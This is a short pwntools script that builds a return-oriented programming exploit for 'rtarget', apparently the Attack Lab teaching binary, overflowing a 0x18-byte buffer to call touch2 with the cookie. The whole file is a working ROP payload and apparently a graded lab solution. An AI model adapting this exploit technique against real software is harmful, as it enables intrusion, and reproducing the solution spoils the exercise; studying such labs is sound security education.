#!/usr/bin/env python3

from pwn import *

proc = process(["rtarget", "-q"])
elf = ELF("rtarget")
rop = ROP("rtarget")
cookie = int(open("cookie.txt").read(), 16)
buffer_size = 0x18

exploit = b"\x90" * buffer_size \
    + p64(rop.rdi.address) \
    + p64(cookie) \
    + p64(rop.ret.address) \
    + p64(elf.symbols["touch2"])
open("r1.in", "wb").write(exploit)

proc.sendline(exploit)
proc.interactive()
